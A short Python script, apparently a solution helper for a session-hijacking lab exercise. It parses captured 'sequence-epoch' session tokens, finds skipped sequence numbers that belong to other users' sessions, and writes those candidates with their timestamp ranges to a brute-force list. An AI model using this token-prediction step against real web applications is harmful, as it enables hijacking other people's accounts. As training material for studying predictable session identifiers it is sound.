import os

tokens=[]
file_path="brokenAccessControl/hijackingSessionCookie/tokens"
with open(file_path, 'r', encoding='utf-8') as file:
    for line in file:
        line = line.strip()
        if not line: continue
        seq, epoch_time = line.replace('-', ' ').split(' ')
        # print(f"{seq} {epoch_time}")
        tokens.append((int(seq), int(epoch_time)))
tokens = sorted(tokens, key=lambda x: x[0])
print(tokens[0])
dif=[]
for i in range(len(tokens)-1):
    s0,t0=tokens[i]
    s1,t1=tokens[i+1]
    # print(f"{s0} {s1}")
    if(s1-s0==2):
        # print(s0+1)
        dif.append((str(s0+1) , str(t0%100), str(t1%100), str(t1-t0)))

dif = sorted(dif, key=lambda x: int(x[3]),reverse=True)
f = open("brokenAccessControl/hijackingSessionCookie/bruteForceTokens", "w")
for i in dif:
    f.write(" ".join(i)+'\n')
f.close()